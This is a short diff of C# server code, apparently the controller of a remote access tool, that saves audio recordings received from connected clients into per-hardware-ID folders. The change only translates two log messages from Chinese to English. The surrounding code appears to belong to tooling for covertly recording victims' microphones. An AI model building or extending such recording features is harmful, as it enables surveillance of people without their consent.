@@ -28,12 +28,12 @@ namespace Server.Handle_Packet
                     byte[] zipFile = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
                     File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", zipFile);
                 });
-                new HandleLogs().Addmsg($"客户端 {client.Ip} 保存音频成功，文件保存在 @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/SaveAudio", Color.Purple);
+                new HandleLogs().Addmsg($"Client {client.Ip} recording success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/SaveAudio", Color.Purple);
                 client.Disconnected();
             }
             catch (Exception ex)
             {
-                new HandleLogs().Addmsg($"保存音频错误 {ex.Message}", Color.Red);
+                new HandleLogs().Addmsg($"Save recorded file fail {ex.Message}", Color.Red);
             }
         }
     }
